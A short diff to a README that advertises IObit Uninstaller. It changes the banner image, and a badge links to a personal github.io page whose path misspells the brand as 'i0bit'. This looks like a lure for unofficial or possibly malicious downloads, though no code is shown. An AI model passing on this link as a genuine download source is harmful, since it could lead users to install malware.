@@ -2,7 +2,7 @@
 
 > A powerful utility designed to help Windows users thoroughly remove unwanted applications and clean residual files, ensuring a cleaner, faster, and more stable system performance without leaving digital clutter behind.
 
-![Banner Placeholder](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgOvQhCjM5iu_GC39VV8MrnxjdKtLk1e1xEA&s)
+![Banner Placeholder](https://www.worthwagon.com/wp-content/uploads/2020/08/IObit-Uninstaller-Pro-Review.png)
 
 [![Get the Software](https://img.shields.io/badge/Get_IObit_Uninstaller_Software-Now-0a5d8d?style=for-the-badge&logo=github)](https://tiffanyhappy0505.github.io/.github/i0bit-uninstaller)
 
